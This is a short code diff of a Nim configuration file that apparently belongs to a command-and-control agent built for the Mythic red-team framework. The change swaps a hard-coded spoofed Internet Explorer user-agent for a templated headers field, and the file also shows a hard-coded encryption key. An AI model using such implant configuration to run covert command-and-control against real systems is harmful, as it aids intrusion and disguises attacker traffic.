@@ -44,7 +44,7 @@ when defined(DEVENV):
         postEndpoint: "data",
         getEndpoint: "",
         getQueryParameter: "q",
-        httpHeaders: @[Header(key: "user-agent", value: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"),],
+        httpHeaders: {{HTTP_HEADERS}},
         encryptionKey: "IsOejCM9N2ezVj6ejytf05a8Kr8ri4rzKm3v9nplEbQ=",
         transferBytesUp: 312000,
         transferBytesDown: 312000
@@ -77,7 +77,7 @@ when defined(MYTHIC_BUILD):
       postEndpoint: "{{post_uri}}",
       getEndpoint: "{{get_uri}}",
       getQueryParameter: "{{query_path_name}}",
-      httpHeaders: @[Header(key: "user-agent", value: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"),],
+      httpHeaders: {{HTTP_HEADERS}},
       encryptionKey: "{{AESPSK}}",
       transferBytesUp: 312000,
       transferBytesDown: 312000
